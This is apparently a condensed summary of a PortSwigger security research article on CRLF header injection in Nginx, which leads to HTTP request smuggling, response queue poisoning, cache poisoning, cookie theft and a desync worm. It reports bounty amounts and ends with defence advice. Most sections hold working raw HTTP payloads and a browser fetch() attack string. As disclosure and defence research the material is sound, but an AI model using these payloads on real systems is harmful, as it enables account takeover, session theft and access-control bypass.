---
title: "CRLF-Powered Desync Attacks: Beheading HTTP Streams"
url: "https://portswigger.net/research/crlf-powered-desync-attacks"
vuln_class: "HTTP Request Smuggling"
tech: "Nginx, CDN, HTTP/1.1"
bounty: 20000
source: "PortSwigger Research"
content_quality: "full"
date: 2026-08-05
---

## Abstract
HTTP Header Injection is severely underestimated. A simple header-injection primitive can be
turned into a full desync worm, and into XSS that steals HTTPOnly cookies. Co-authored with
Tobia Righi (TurtleSec).

## Root cause (Nginx $uri normalisation)
If `$uri` is used in `proxy_pass`, Nginx normalises the path and url-decodes encoded chars
including CRLF (`%0d%0a`), letting you inject new lines into the upstream request:

```nginx
location / { proxy_pass http://backend$uri; }
```

```http
GET /%20HTTP/1.1%0d%0aContent-Length:%20X%0d%0aX:%20x HTTP/1.1
Host: example.com
```

## Detecting request header injection
Inject invalid HTTP syntax and look for a predictable status code:
```
GET /<@urlencode_all> HTTP/13.37  <newline> Foo: bar </@urlencode_all> HTTP/1.1   -> 505 Version Not Supported
GET /<@urlencode_all> HTTP/1.1 <newline> Transfer-Encoding: x <newline> Foo: bar</@urlencode_all> HTTP/1.1 -> 501 Not Implemented
```

## HTTP Request Splitting -> Response Queue Poisoning (RQP)
Two CRLF sequences in a row are a request boundary. Split into exactly two requests to get RQP
(everyone receives other users' responses):
```
GET /<@urlencode_all> HTTP/1.1
Host: example.com
Connection: keep-alive

TRACE / HTTP/1.1
X: x</@urlencode_all> HTTP/1.1
Host: example.com
```
Seen inside a CDN's own infra (responses from unrelated apps), and via a custom upstream header
(`X-Original-Url`) on a telecom -> stole internal access tokens, **$20,000**.

## CRLF-Powered CL.TE desync (single injected header)
Inject a Transfer-Encoding header with a Content-Length body -> classic CL.TE desync:
```
POST /<@urlencode_all> HTTP/1.1
Transfer-Encoding: chunked
Foo: bar</@urlencode_all> HTTP/1.1
Host: clothes.shop
Content-Length: 66

0

POST /user/update?name=t0xodile
Cookie: SESSID=abcdefg
X: x
```
`$2,200`. Response reflection of the session cookie caused accidental login of live users.
Doubled as account takeover by overwriting victim emails.

## Cache poisoning + AI-generated HEAD gadget
Zero gadgets -> use the HEAD technique. Need an exact response size; a `414 URI Too Long`
served to random users with an overlong HEAD path.
```
POST /<@urlencode_all> HTTP/1.1
Transfer-Encoding: chunked
Foo: bar</@urlencode_all> HTTP/1.1
Host: cdn.doomscroll.com
Content-Length: <correct>

0

HEAD /?<a*1000> HTTP/1.1

GET / HTTP/1.1
X-Reflect: <img/src/onerror=fetch()>
Content-Length: 100
x=y
```

## Browser-powered + desync worm
Most CRLF desyncs are fetch-spec compatible -> launch from the victim's browser:
```
fetch("https://example.com/%20HTTP/1.1%0d%0aHost:%20example.com%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar")
```
Combined with XSS (HEAD technique) -> self-replicating CRLF-powered desync worm.

## Tunnelling / access-control bypass
Nginx reading an unexpected `100-continue` reads until close -> reveals the tunnelled response.
Bypass front-end access control to reach an internal config:
```
GET /robots.txt<@urlencode_all> HTTP/1.1
Host: carmanufacturer.com
Connection: keep-alive
Expect: 100-continue

GET /config HTTP/1.1
X: x</@urlencode_all>
```

## Connection-locked 0.CL / IP-locked (HEAD + Range)
- 0.CL: reuse keep-alive connections; window.open()+location to land both requests on one connection -> XSS -> **$5,000**.
- IP-locked (HTTP/2 + injected Expect): use the `Range` header as a HEAD gadget to read an arbitrary length (e.g. `Range: bytes=1-650`), stack requests for opening/closing `<script>`. iframe-spam technique for the browser -> **$3,255**.
- Stealing HTTPOnly cookies: HEAD technique + stacked `Set-Cookie` response header pushed into the XSS response body.

## Response header injection
`location / { return 302 https://example.com$uri; }` -> inject `Set-Cookie` (cookie tossing) or
break into the body. TikTok cookie tossing -> stole private clips, **$4,500**. Bypass the redirect
with `CDN-Cache-Control: private="Location"` to get XSS on a redirect response; bypass WAF with
`Content-Type: text/html;charset=ISO-2022-JP` + `$B` escape sequences.

## Defence
Avoid `$uri`/`$document_uri` in `proxy_pass`/`return`; exclude whitespace in regex vars; enable
HTTP/2 upstream.

## Tooling
- https://github.com/t0xodile/crlf-powered-desync-scanner
- https://github.com/turtlesec-software/crlf-desyncs
